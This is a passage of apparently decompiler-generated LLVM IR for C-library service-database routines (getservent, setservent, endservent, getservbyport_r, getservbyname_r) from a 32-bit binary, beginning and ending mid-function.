  %v1_8064188 = inttoptr i32 %v1_806417e to i32*
  store i32 5, i32* %v1_8064188, align 4
  br label %dec_label_pc_8064283

dec_label_pc_80641b1:                             ; preds = %dec_label_pc_8064193.preheader, %dec_label_pc_8064193.backedge
  %v3_80641a338 = phi i32 [ %v3_80641a3, %dec_label_pc_8064193.backedge ], [ %v3_80641a336, %dec_label_pc_8064193.preheader ]
  %v1_80641b1 = inttoptr i32 %v3_80641a338 to i8*
  %v2_80641b1 = load i8, i8* %v1_80641b1, align 1
  %v11_80641b1 = icmp eq i8 %v2_80641b1, 35
  br i1 %v11_80641b1, label %dec_label_pc_8064193.backedge, label %dec_label_pc_80641b6

dec_label_pc_8064193.backedge:                    ; preds = %dec_label_pc_80641b1, %dec_label_pc_80641b6, %dec_label_pc_80641ca, %dec_label_pc_80641f6
  %v0_8064194.pre = load i32, i32* @global_var_807d264.814, align 4
  store i32 %v1_8064129, i32* %stack_var_-60, align 4
  %v3_80641a3 = call i32 @fgets(i32 %v1_8064129, i32 4096, i32 %v0_8064194.pre)
  store i32 %v3_80641a3, i32* %eax.global-to-local, align 4
  store i32 %v3_80641a3, i32* @ebx, align 4
  %v1_80641ad = icmp eq i32 %v3_80641a3, 0
  br i1 %v1_80641ad, label %dec_label_pc_806417e, label %dec_label_pc_80641b1

dec_label_pc_80641b6:                             ; preds = %dec_label_pc_80641b1
  store i32 %v3_80641a338, i32* %stack_var_-60, align 4
  %v3_80641be = call i32 @__GI_strpbrk(i8* %v1_80641b1, i32 ptrtoint ([3 x i8]* @global_var_806e2b6.817 to i32))
  store i32 %v3_80641be, i32* %eax.global-to-local, align 4
  %v1_80641c6 = icmp eq i32 %v3_80641be, 0
  br i1 %v1_80641c6, label %dec_label_pc_8064193.backedge, label %dec_label_pc_80641ca

dec_label_pc_80641ca:                             ; preds = %dec_label_pc_80641b6
  %v1_80641ca = inttoptr i32 %v3_80641be to i8*
  store i8 0, i8* %v1_80641ca, align 1
  %v0_80641cd = load i32, i32* @ebx, align 4
  %v1_80641cd = load i32, i32* @edi, align 4
  %v2_80641cd = inttoptr i32 %v1_80641cd to i32*
  store i32 %v0_80641cd, i32* %v2_80641cd, align 4
  %v0_80641d6 = load i32, i32* @ebx, align 4
  store i32 %v0_80641d6, i32* %stack_var_-60, align 4
  %v2_80641d7 = inttoptr i32 %v0_80641d6 to i8*
  %v3_80641d7 = call i32 @__GI_strpbrk(i8* %v2_80641d7, i32 ptrtoint ([3 x i8]* @global_var_806e2b9.818 to i32))
  store i32 %v3_80641d7, i32* %eax.global-to-local, align 4
  %v1_80641df = icmp eq i32 %v3_80641d7, 0
  br i1 %v1_80641df, label %dec_label_pc_8064193.backedge, label %dec_label_pc_80641e3

dec_label_pc_80641e3:                             ; preds = %dec_label_pc_80641ca
  %v1_80641e3 = add i32 %v3_80641d7, 1
  store i32 %v1_80641e3, i32* @esi, align 4
  %v1_80641e6 = inttoptr i32 %v3_80641d7 to i8*
  store i8 0, i8* %v1_80641e6, align 1
  %v0_80641ec.pre = load i32, i32* @esi, align 4
  %v4_80641ec.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80641ec

dec_label_pc_80641eb:                             ; preds = %dec_label_pc_80641f2, %dec_label_pc_80641ec
  %v1_80641eb = add i32 %v0_80641eb, 1
  store i32 %v1_80641eb, i32* @esi, align 4
  br label %dec_label_pc_80641ec

dec_label_pc_80641ec:                             ; preds = %dec_label_pc_80641e3, %dec_label_pc_80641eb
  %v4_80641ec = phi i32 [ %v4_80641ec.pre, %dec_label_pc_80641e3 ], [ %v6_80641ec, %dec_label_pc_80641eb ]
  %v0_80641eb = phi i32 [ %v0_80641ec.pre, %dec_label_pc_80641e3 ], [ %v1_80641eb, %dec_label_pc_80641eb ]
  %v1_80641ec = inttoptr i32 %v0_80641eb to i8*
  %v2_80641ec = load i8, i8* %v1_80641ec, align 1
  %v3_80641ec = zext i8 %v2_80641ec to i32
  %v5_80641ec = and i32 %v4_80641ec, -256
  %v6_80641ec = or i32 %v3_80641ec, %v5_80641ec
  store i32 %v6_80641ec, i32* %eax.global-to-local, align 4
  %v7_80641ee = icmp eq i8 %v2_80641ec, 32
  br i1 %v7_80641ee, label %dec_label_pc_80641eb, label %dec_label_pc_80641f2

dec_label_pc_80641f2:                             ; preds = %dec_label_pc_80641ec
  %v10_80641f2 = icmp eq i8 %v2_80641ec, 9
  br i1 %v10_80641f2, label %dec_label_pc_80641eb, label %dec_label_pc_80641f6

dec_label_pc_80641f6:                             ; preds = %dec_label_pc_80641f2
  store i32 %v0_80641eb, i32* %stack_var_-60, align 4
  %v3_80641fe = call i32 @__GI_strpbrk(i8* %v1_80641ec, i32 ptrtoint ([3 x i8]* @global_var_806e2bc.819 to i32))
  store i32 %v3_80641fe, i32* %eax.global-to-local, align 4
  %v1_8064206 = icmp eq i32 %v3_80641fe, 0
  br i1 %v1_8064206, label %dec_label_pc_8064193.backedge, label %dec_label_pc_806420a

dec_label_pc_806420a:                             ; preds = %dec_label_pc_80641f6
  %v1_806420d = inttoptr i32 %v3_80641fe to i8*
  store i8 0, i8* %v1_806420d, align 1
  %v0_8064210 = load i32, i32* %eax.global-to-local, align 4
  %v1_8064210 = add i32 %v0_8064210, 1
  store i32 %v1_8064210, i32* @ebx, align 4
  %v0_8064213 = load i32, i32* @esi, align 4
  store i32 %v0_8064213, i32* %stack_var_-60, align 4
  %v1_8064214 = call i32 @atol(i32 %v0_8064213)
  %v1_8064219 = trunc i32 %v1_8064214 to i16
  %v2_8064219 = call i16 @llvm.bswap.i16(i16 %v1_8064219)
  %v3_8064219 = zext i16 %v2_8064219 to i32
  store i32 %v3_8064219, i32* %eax.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_806e2bc.819 to i32), i32* %edx.global-to-local, align 4
  %v1_8064222 = load i32, i32* @edi, align 4
  %v2_8064222 = add i32 %v1_8064222, 8
  %v3_8064222 = inttoptr i32 %v2_8064222 to i32*
  store i32 %v3_8064219, i32* %v3_8064222, align 4
  %v0_8064225 = load i32, i32* @ebx, align 4
  %v1_8064225 = load i32, i32* @edi, align 4
  %v2_8064225 = add i32 %v1_8064225, 12
  %v3_8064225 = inttoptr i32 %v2_8064225 to i32*
  store i32 %v0_8064225, i32* %v3_8064225, align 4
  %v0_8064228 = load i32, i32* @ebp, align 4
  %v1_8064228 = load i32, i32* @edi, align 4
  %v2_8064228 = add i32 %v1_8064228, 4
  %v3_8064228 = inttoptr i32 %v2_8064228 to i32*
  store i32 %v0_8064228, i32* %v3_8064228, align 4
  %v0_806422b = load i32, i32* @ebp, align 4
  store i32 %v0_806422b, i32* @esi, align 4
  %v0_8064232 = load i32, i32* @ebx, align 4
  store i32 %v0_8064232, i32* %stack_var_-60, align 4
  %v2_8064233 = inttoptr i32 %v0_8064232 to i8*
  %v3_8064233 = call i32 @__GI_strpbrk(i8* %v2_8064233, i32 ptrtoint ([3 x i8]* @global_var_806e2b9.818 to i32))
  store i32 %v3_8064233, i32* %eax.global-to-local, align 4
  store i32 %v3_8064233, i32* %edx.global-to-local, align 4
  %v1_806426334 = icmp eq i32 %v3_8064233, 0
  br i1 %v1_806426334, label %dec_label_pc_8064275, label %dec_label_pc_8064267

dec_label_pc_806423a:                             ; preds = %dec_label_pc_806426f
  %v7_806423a = icmp eq i8 %v2_806426f, 32
  br i1 %v7_806423a, label %dec_label_pc_806426a.backedge, label %dec_label_pc_806423e

dec_label_pc_806426a.backedge:                    ; preds = %dec_label_pc_806423a, %dec_label_pc_806423e
  %v1_806426a = add i32 %v1_806426a33, 1
  %v8_806426a = icmp eq i32 %v1_806426a, 0
  store i32 %v1_806426a, i32* %edx.global-to-local, align 4
  br i1 %v8_806426a, label %dec_label_pc_8064275, label %dec_label_pc_806426f

dec_label_pc_806423e:                             ; preds = %dec_label_pc_806423a
  %v10_806423e = icmp eq i8 %v2_806426f, 9
  br i1 %v10_806423e, label %dec_label_pc_806426a.backedge, label %dec_label_pc_8064242

dec_label_pc_8064242:                             ; preds = %dec_label_pc_806423e
  %v0_8064242 = load i32, i32* @ebp, align 4
  %v1_8064242 = add i32 %v0_8064242, 136
  store i32 %v1_8064242, i32* %eax.global-to-local, align 4
  %v0_8064248 = load i32, i32* @esi, align 4
  %v7_8064248 = icmp ult i32 %v0_8064248, %v1_8064242
  %v1_806424a = icmp eq i1 %v7_8064248, false
  br i1 %v1_806424a, label %dec_label_pc_8064251, label %dec_label_pc_806424c

dec_label_pc_806424c:                             ; preds = %dec_label_pc_8064242
  %v2_806424c = inttoptr i32 %v0_8064248 to i32*
  store i32 %v1_806426a33, i32* %v2_806424c, align 4
  %v0_806424e = load i32, i32* @esi, align 4
  %v1_806424e = add i32 %v0_806424e, 4
  store i32 %v1_806424e, i32* @esi, align 4
  %v0_8064258.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8064251

dec_label_pc_8064251:                             ; preds = %dec_label_pc_8064242, %dec_label_pc_806424c
  %v0_8064258 = phi i32 [ %v1_806426a33, %dec_label_pc_8064242 ], [ %v0_8064258.pre, %dec_label_pc_806424c ]
  store i32 %v0_8064258, i32* %stack_var_-60, align 4
  %v2_8064259 = inttoptr i32 %v0_8064258 to i8*
  %v3_8064259 = call i32 @__GI_strpbrk(i8* %v2_8064259, i32 ptrtoint ([3 x i8]* @global_var_806e2b9.818 to i32))
  store i32 %v3_8064259, i32* %eax.global-to-local, align 4
  store i32 %v3_8064259, i32* %edx.global-to-local, align 4
  %v1_8064263 = icmp eq i32 %v3_8064259, 0
  br i1 %v1_8064263, label %dec_label_pc_8064275, label %dec_label_pc_8064267

dec_label_pc_8064267:                             ; preds = %dec_label_pc_806420a, %dec_label_pc_8064251
  %v0_806426735 = phi i32 [ %v3_8064259, %dec_label_pc_8064251 ], [ %v3_8064233, %dec_label_pc_806420a ]
  %v1_8064267 = inttoptr i32 %v0_806426735 to i8*
  store i8 0, i8* %v1_8064267, align 1
  %v0_806426a.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_806426a31 = add i32 %v0_806426a.pre, 1
  %v8_806426a32 = icmp eq i32 %v1_806426a31, 0
  store i32 %v1_806426a31, i32* %edx.global-to-local, align 4
  br i1 %v8_806426a32, label %dec_label_pc_8064275, label %dec_label_pc_806426f.lr.ph

dec_label_pc_806426f.lr.ph:                       ; preds = %dec_label_pc_8064267
  %v4_806426f.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806426f

dec_label_pc_806426f:                             ; preds = %dec_label_pc_806426f.lr.ph, %dec_label_pc_806426a.backedge
  %v4_806426f = phi i32 [ %v4_806426f.pre, %dec_label_pc_806426f.lr.ph ], [ %v6_806426f, %dec_label_pc_806426a.backedge ]
  %v1_806426a33 = phi i32 [ %v1_806426a31, %dec_label_pc_806426f.lr.ph ], [ %v1_806426a, %dec_label_pc_806426a.backedge ]
  %v1_806426f = inttoptr i32 %v1_806426a33 to i8*
  %v2_806426f = load i8, i8* %v1_806426f, align 1
  %v3_806426f = zext i8 %v2_806426f to i32
  %v5_806426f = and i32 %v4_806426f, -256
  %v6_806426f = or i32 %v5_806426f, %v3_806426f
  store i32 %v6_806426f, i32* %eax.global-to-local, align 4
  %v4_8064271 = icmp eq i8 %v2_806426f, 0
  %v1_8064273 = icmp eq i1 %v4_8064271, false
  br i1 %v1_8064273, label %dec_label_pc_806423a, label %dec_label_pc_8064275

dec_label_pc_8064275:                             ; preds = %dec_label_pc_806420a, %dec_label_pc_8064251, %dec_label_pc_8064267, %dec_label_pc_806426a.backedge, %dec_label_pc_806426f
  %v0_8064275 = load i32, i32* @esi, align 4
  %v1_8064275 = inttoptr i32 %v0_8064275 to i32*
  store i32 0, i32* %v1_8064275, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %arg4, i32* %eax.global-to-local, align 4
  %v0_8064281 = load i32, i32* @edi, align 4
  store i32 %v0_8064281, i32* %v1_80640eb, align 4
  br label %dec_label_pc_8064283

dec_label_pc_8064283:                             ; preds = %dec_label_pc_806417e, %dec_label_pc_8064143, %dec_label_pc_8064275
  store i32 %v2_8064113, i32* %eax.global-to-local, align 4
  store i32 %v2_8064113, i32* %stack_var_-60, align 4
  %v3_806428c = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v3_806428c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064294

dec_label_pc_8064294:                             ; preds = %dec_label_pc_80640f3, %dec_label_pc_8064283
  %v0_8064297 = load i32, i32* @ebx, align 4
  store i32 %v0_8064297, i32* %eax.global-to-local, align 4
  store i32 %v0_80640d1, i32* @ebx, align 4
  store i32 %v0_80640d0, i32* @esi, align 4
  store i32 %v0_80640cf, i32* @edi, align 4
  store i32 %v0_80640ce, i32* @ebp, align 4
  ret i32 %v0_8064297

; uselistorder directives
  uselistorder i32 %v6_806426f, { 1, 0 }
  uselistorder i8 %v2_806426f, { 2, 3, 1, 0 }
  uselistorder i32 %v1_806426a33, { 3, 2, 1, 0 }
  uselistorder i32 %v3_8064259, { 0, 2, 3, 1 }
  uselistorder i32 %v0_8064258, { 1, 0 }
  uselistorder i32 %v6_80641ec, { 1, 0 }
  uselistorder i32 %v0_80641eb, { 0, 2, 1 }
  uselistorder i32 %v3_80641d7, { 1, 0, 2, 3 }
  uselistorder i32 %v3_80641a3, { 2, 1, 3, 0 }
  uselistorder i32 %v3_80641a338, { 1, 0 }
  uselistorder i32 %v2_806416d, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8064129, { 4, 3, 0, 1, 2 }
  uselistorder i32* %stack_var_-60, { 2, 3, 4, 5, 6, 7, 8, 9, 1, 0, 10, 11, 12 }
  uselistorder i32* %edx.global-to-local, { 6, 2, 3, 5, 1, 0, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 5, 22, 21, 4, 23, 6, 7, 8, 9, 10, 11, 12, 13, 14, 24, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 (i32)* @atol, { 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8 9, { 0, 1, 3, 2 }
  uselistorder i32 140, { 3, 0, 2, 1 }
  uselistorder i32 %arg4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8064294, { 1, 0 }
  uselistorder label %dec_label_pc_8064283, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8064275, { 4, 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8064267, { 1, 0 }
  uselistorder label %dec_label_pc_8064251, { 1, 0 }
  uselistorder label %dec_label_pc_806426a.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_80641ec, { 1, 0 }
  uselistorder label %dec_label_pc_8064193.backedge, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80641b1, { 1, 0 }
  uselistorder label %dec_label_pc_806417e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8064193.preheader, { 1, 0 }
}

define i32 @getservent() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80642a1 = call i32 @__initbuf()
  %v2_80642a6 = ptrtoint i32* %stack_var_-4 to i32
  %v0_80642b0 = load i32, i32* @global_var_807d260.812, align 32
  %v5_80642bb = call i32 @getservent_r(i32* nonnull @global_var_807d268.820, i32 %v0_80642b0, i32 4237, i32 %v2_80642a6)
  %v3_80642c0 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_80642c0
}

define i32 @__GI_endservent() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80642c8 = load i32, i32* @ebx, align 4
  store i32 %v0_80642c8, i32* %stack_var_-4, align 4
  %v2_80642d6 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80642d6, i32* @ebx, align 4
  %v4_80642db = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-20, i32 134585853, i32 ptrtoint (i32* @global_var_8074884.813 to i32))
  %v1_80642e7 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074884.813 to i32))
  %v0_80642ec = load i32, i32* @global_var_807d264.814, align 4
  %v1_80642f4 = icmp eq i32 %v0_80642ec, 0
  br i1 %v1_80642f4, label %dec_label_pc_806430e, label %dec_label_pc_80642f8

dec_label_pc_80642f8:                             ; preds = %entry
  %v1_80642fc = inttoptr i32 %v0_80642ec to i16*
  %v2_80642fc = call i32 @__GI_fclose(i16* %v1_80642fc)
  store i32 0, i32* @global_var_807d264.814, align 4
  br label %dec_label_pc_806430e

dec_label_pc_806430e:                             ; preds = %entry, %dec_label_pc_80642f8
  store i8 0, i8* @global_var_807d278.821, align 8
  %v3_806431a = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-20, i32 1)
  %v2_8064322 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8064322, i32* @ebx, align 4
  ret i32 %v3_806431a

; uselistorder directives
  uselistorder label %dec_label_pc_806430e, { 1, 0 }
}

define i32 @setservent(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v4_8064336 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-16, i32 134585853, i32 ptrtoint (i32* @global_var_8074884.813 to i32))
  %v1_8064342 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074884.813 to i32))
  %v0_8064347 = load i32, i32* @global_var_807d264.814, align 4
  store i32 %v0_8064347, i32* @eax, align 4
  %v1_806434f = icmp eq i32 %v0_8064347, 0
  %v1_8064351 = icmp eq i1 %v1_806434f, false
  br i1 %v1_8064351, label %dec_label_pc_806436b, label %dec_label_pc_8064353

dec_label_pc_8064353:                             ; preds = %entry
  %v2_806435f = call i32 @__GI_fopen(i32 ptrtoint ([14 x i8]* @global_var_806e2a8.816 to i32), i32 ptrtoint (i32* @global_var_806e2f1.815 to i32))
  store i32 %v2_806435f, i32* @global_var_807d264.814, align 4
  br label %dec_label_pc_8064374

dec_label_pc_806436b:                             ; preds = %entry
  %v1_806436f = inttoptr i32 %v0_8064347 to i16*
  %v2_806436f = call i32 @__GI_rewind(i16* %v1_806436f)
  br label %dec_label_pc_8064374

dec_label_pc_8064374:                             ; preds = %dec_label_pc_8064353, %dec_label_pc_806436b
  %v4_8064377 = icmp eq i32 %arg1, 0
  br i1 %v4_8064377, label %dec_label_pc_8064385, label %dec_label_pc_806437e

dec_label_pc_806437e:                             ; preds = %dec_label_pc_8064374
  store i8 1, i8* @global_var_807d278.821, align 8
  br label %dec_label_pc_8064385

dec_label_pc_8064385:                             ; preds = %dec_label_pc_8064374, %dec_label_pc_806437e
  %v3_806438e = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-16, i32 1)
  ret i32 %v3_806438e

; uselistorder directives
  uselistorder i32* @global_var_807d264.814, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder label %dec_label_pc_8064385, { 1, 0 }
  uselistorder label %dec_label_pc_8064374, { 1, 0 }
}

define i32 @__GI_getservbyport_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32* %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %tmp4 = ptrtoint i32* %arg6 to i32
  %stack_var_-32 = alloca i32, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  store i32 %tmp4, i32* @ebp, align 4
  %v4_80643b9 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134585853, i32 ptrtoint (i32* @global_var_8074884.813 to i32))
  %v1_80643c5 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074884.813 to i32))
  %v0_80643ca = load i8, i8* @global_var_807d278.821, align 8
  %v1_80643ca = sext i8 %v0_80643ca to i32
  %v1_80643d4 = call i32 @setservent(i32 %v1_80643ca)
  %v1_80643e7 = icmp eq i32 %arg2, 0
  br label %dec_label_pc_80643fd

dec_label_pc_80643de:                             ; preds = %dec_label_pc_80643fd
  store i32 %arg1, i32* @eax, align 4
  %v0_80643e2 = load i32, i32* @esi, align 4
  %v1_80643e2 = add i32 %v0_80643e2, 8
  %v2_80643e2 = inttoptr i32 %v1_80643e2 to i32*
  %v3_80643e2 = load i32, i32* %v2_80643e2, align 4
  %v15_80643e2 = icmp eq i32 %v3_80643e2, %arg1
  %v1_80643e5 = icmp eq i1 %v15_80643e2, false
  br i1 %v1_80643e5, label %dec_label_pc_80643fd, label %dec_label_pc_80643e7

dec_label_pc_80643e7:                             ; preds = %dec_label_pc_80643de
  br i1 %v1_80643e7, label %dec_label_pc_8064415, label %dec_label_pc_80643eb

dec_label_pc_80643eb:                             ; preds = %dec_label_pc_80643e7
  %v1_80643ee = add i32 %v0_80643e2, 12
  %v2_80643ee = inttoptr i32 %v1_80643ee to i32*
  %v3_80643ee = load i32, i32* %v2_80643ee, align 4
  %v3_80643f1 = inttoptr i32 %v3_80643ee to i8*
  %v4_80643f1 = call i32 @__GI_strcoll(i8* %v3_80643f1, i32 %arg2, i32 %arg1)
  %v1_80643f9 = icmp eq i32 %v4_80643f1, 0
  br i1 %v1_80643f9, label %dec_label_pc_8064415, label %dec_label_pc_80643fd

dec_label_pc_80643fd:                             ; preds = %dec_label_pc_80643eb, %dec_label_pc_80643de, %entry
  %v0_80643fd = load i32, i32* @ebp, align 4
  %v0_8064406 = load i32, i32* @esi, align 4
  %v4_8064407 = inttoptr i32 %v0_8064406 to i32*
  %v5_8064407 = call i32 @getservent_r(i32* %v4_8064407, i32 %arg4, i32 %arg5, i32 %v0_80643fd)
  store i32 %v5_8064407, i32* @ebx, align 4
  %v1_8064411 = icmp eq i32 %v5_8064407, 0
  br i1 %v1_8064411, label %dec_label_pc_80643de, label %dec_label_pc_8064415

dec_label_pc_8064415:                             ; preds = %dec_label_pc_80643eb, %dec_label_pc_80643e7, %dec_label_pc_80643fd
  %v0_8064415 = load i8, i8* @global_var_807d278.821, align 8
  %v1_8064415 = icmp eq i8 %v0_8064415, 0
  %v1_806441c = icmp eq i1 %v1_8064415, false
  br i1 %v1_806441c, label %dec_label_pc_8064423, label %dec_label_pc_806441e

dec_label_pc_806441e:                             ; preds = %dec_label_pc_8064415
  %v0_806441e = call i32 @__GI_endservent()
  br label %dec_label_pc_8064423

dec_label_pc_8064423:                             ; preds = %dec_label_pc_8064415, %dec_label_pc_806441e
  %v3_806442c = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v0_8064433 = load i32, i32* @ebp, align 4
  %v1_8064433 = inttoptr i32 %v0_8064433 to i32*
  %v2_8064433 = load i32, i32* %v1_8064433, align 4
  %v3_8064433 = icmp eq i32 %v2_8064433, 0
  %v1_806443f = load i32, i32* @ebx, align 4
  %v2_806443f = select i1 %v3_8064433, i32 %v1_806443f, i32 0
  ret i32 %v2_806443f

; uselistorder directives
  uselistorder i32 %v5_8064407, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8064423, { 1, 0 }
  uselistorder label %dec_label_pc_8064415, { 2, 0, 1 }
}

define i32 @__GI_getservbyport(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8064449 = call i32 @__initbuf()
  %v0_806445a = load i32, i32* @global_var_807d260.812, align 32
  %v9_806446d = call i32 @__GI_getservbyport_r(i32 %arg1, i32 %arg2, i32 ptrtoint (i32* @global_var_807d268.820 to i32), i32 %v0_806445a, i32 4237, i32* nonnull %stack_var_-4, i32 %v0_8064449, i32 %v0_8064449)
  %v3_8064472 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_8064472

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @getservbyname_r(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %tmp19 = ptrtoint i32* %arg3 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_806447a = load i32, i32* @ebp, align 4
  %v0_806447b = load i32, i32* @edi, align 4
  %v0_806447c = load i32, i32* @esi, align 4
  %v0_806447d = load i32, i32* @ebx, align 4
  store i32 %v0_806447d, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* @ebp, align 4
  store i32 %tmp19, i32* @esi, align 4
  %v4_8064498 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134585853, i32 ptrtoint (i32* @global_var_8074884.813 to i32))
  %v1_80644a4 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074884.813 to i32))
  %v0_80644a9 = load i8, i8* @global_var_807d278.821, align 8
  %v1_80644a9 = sext i8 %v0_80644a9 to i32
  %v1_80644b3 = call i32 @setservent(i32 %v1_80644a9)
  %v3_80644c5 = inttoptr i32 %arg1 to i8*
  %v1_80644f4 = icmp eq i32 %arg2, 0
  br label %dec_label_pc_806450a

dec_label_pc_80644bd:                             ; preds = %dec_label_pc_806450a
  %v0_80644bd = load i32, i32* @ecx, align 4
  %v0_80644bf = load i32, i32* @esi, align 4
  %v1_80644bf = inttoptr i32 %v0_80644bf to i32*
  %v2_80644bf = load i32, i32* %v1_80644bf, align 4
  %v4_80644c5 = call i32 @__GI_strcoll(i8* %v3_80644c5, i32 %v2_80644bf, i32 %v0_80644bd)
  store i32 %v4_80644c5, i32* @eax, align 4
  %v1_80644cd = icmp eq i32 %v4_80644c5, 0
  br i1 %v1_80644cd, label %dec_label_pc_80644f4, label %dec_label_pc_80644d1

dec_label_pc_80644d1:                             ; preds = %dec_label_pc_80644bd
  %v0_80644d1 = load i32, i32* @esi, align 4
  %v1_80644d1 = add i32 %v0_80644d1, 4
  %v2_80644d1 = inttoptr i32 %v1_80644d1 to i32*
  %v3_80644d1 = load i32, i32* %v2_80644d1, align 4
  store i32 %v3_80644d1, i32* @ebx, align 4
  %v1_80644ec1 = inttoptr i32 %v3_80644d1 to i32*
  %v2_80644ec2 = load i32, i32* %v1_80644ec1, align 4
  store i32 %v2_80644ec2, i32* @eax, align 4
  %v1_80644ee3 = icmp eq i32 %v2_80644ec2, 0
  %v1_80644f010 = icmp eq i1 %v1_80644ee3, false
  br i1 %v1_80644f010, label %dec_label_pc_80644d6, label %dec_label_pc_806450a

dec_label_pc_80644d6:                             ; preds = %dec_label_pc_80644d1, %dec_label_pc_80644e9
  %v2_80644ec11 = phi i32 [ %v2_80644ec, %dec_label_pc_80644e9 ], [ %v2_80644ec2, %dec_label_pc_80644d1 ]
  %v0_80644d6 = load i32, i32* @edx, align 4
  %v4_80644dd = call i32 @__GI_strcoll(i8* %v3_80644c5, i32 %v2_80644ec11, i32 %v0_80644d6)
  store i32 %v4_80644dd, i32* @eax, align 4
  %v1_80644e5 = icmp eq i32 %v4_80644dd, 0
  br i1 %v1_80644e5, label %dec_label_pc_80644f4, label %dec_label_pc_80644e9

dec_label_pc_80644e9:                             ; preds = %dec_label_pc_80644d6
  %v0_80644e9 = load i32, i32* @ebx, align 4
  %v1_80644e9 = add i32 %v0_80644e9, 4
  store i32 %v1_80644e9, i32* @ebx, align 4
  %v1_80644ec = inttoptr i32 %v1_80644e9 to i32*
  %v2_80644ec = load i32, i32* %v1_80644ec, align 4
  store i32 %v2_80644ec, i32* @eax, align 4
  %v1_80644ee = icmp eq i32 %v2_80644ec, 0
  %v1_80644f0 = icmp eq i1 %v1_80644ee, false
  br i1 %v1_80644f0, label %dec_label_pc_80644d6, label %dec_label_pc_806450a

dec_label_pc_80644f4:                             ; preds = %dec_label_pc_80644d6, %dec_label_pc_80644bd
  br i1 %v1_80644f4, label %dec_label_pc_8064525, label %dec_label_pc_80644f8

dec_label_pc_80644f8:                             ; preds = %dec_label_pc_80644f4
  %v0_80644fb = load i32, i32* @esi, align 4
  %v1_80644fb = add i32 %v0_80644fb, 12
  %v2_80644fb = inttoptr i32 %v1_80644fb to i32*
  %v3_80644fb = load i32, i32* %v2_80644fb, align 4
  %v3_80644fe = inttoptr i32 %v3_80644fb to i8*
  %v4_80644fe = call i32 @__GI_strcoll(i8* %v3_80644fe, i32 0, i32 0)
  %v1_8064506 = icmp eq i32 %v4_80644fe, 0
  br i1 %v1_8064506, label %dec_label_pc_8064525, label %dec_label_pc_806450a

dec_label_pc_806450a:                             ; preds = %dec_label_pc_80644e9, %dec_label_pc_80644d1, %dec_label_pc_80644f8, %entry
  %v0_8064516 = load i32, i32* @esi, align 4
  %v4_8064517 = inttoptr i32 %v0_8064516 to i32*
  %v5_8064517 = call i32 @getservent_r(i32* %v4_8064517, i32 %arg4, i32 %arg5, i32 %arg6)
  store i32 %v5_8064517, i32* @eax, align 4
  store i32 %v5_8064517, i32* @edi, align 4
  %v1_8064521 = icmp eq i32 %v5_8064517, 0
  br i1 %v1_8064521, label %dec_label_pc_80644bd, label %dec_label_pc_8064525

dec_label_pc_8064525:                             ; preds = %dec_label_pc_80644f8, %dec_label_pc_80644f4, %dec_label_pc_806450a
  %v0_8064525 = load i8, i8* @global_var_807d278.821, align 8
  %v1_8064525 = icmp eq i8 %v0_8064525, 0
  %v1_806452c = icmp eq i1 %v1_8064525, false
  br i1 %v1_806452c, label %dec_label_pc_8064533, label %dec_label_pc_806452e

dec_label_pc_806452e:                             ; preds = %dec_label_pc_8064525
